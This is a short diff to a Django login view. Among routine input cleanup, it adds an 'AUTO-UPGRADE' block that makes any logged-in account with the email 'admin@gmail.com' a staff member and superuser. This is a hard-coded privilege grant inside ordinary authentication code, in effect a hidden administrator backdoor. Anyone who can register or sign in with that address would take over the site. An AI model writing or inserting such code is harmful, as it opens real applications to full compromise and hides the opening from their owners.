@@ -99,13 +99,21 @@ def register_view(request):
 
 def login_view(request):
     if request.user.is_authenticated:
+        # AUTO-UPGRADE: If already logged in as admin@gmail.com, ensure staff status
+        if request.user.email and request.user.email.lower() == 'admin@gmail.com':
+            if not request.user.is_staff:
+                request.user.is_staff = True
+                request.user.is_superuser = True
+                request.user.save()
+        
         if request.user.is_staff:
             return redirect("admin_dashboard")
         if request.user.is_expert:
             return redirect("expert_dashboard")
         return redirect("home")
+
     if request.method == "POST":
-        email = request.POST.get("email")
+        email = request.POST.get("email", "").strip().lower()
         password = request.POST.get("password")
 
         user = User.objects.filter(email=email).first()
